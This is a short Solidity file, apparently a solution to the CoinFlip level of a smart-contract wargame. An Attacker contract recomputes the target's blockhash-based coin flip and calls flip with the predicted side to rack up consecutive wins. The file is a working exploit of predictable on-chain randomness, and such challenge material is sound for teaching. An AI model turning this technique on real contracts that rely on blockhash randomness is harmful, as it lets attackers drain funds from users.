//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/level03.sol";
import "hardhat/console.sol";


contract Attacker
{
    CoinFlip level03 = CoinFlip(0x355B18FC6e47dE7e29c456362DAC1Bfbba67c681);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function test() external
    {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        console.log("Consecutive Wins Before: ", level03.consecutiveWins());
        if (side) {
            level03.flip(true); 
        } else {
            level03.flip(false);
        }
        console.log("Consecutive Wins After: ", level03.consecutiveWins());
    }
}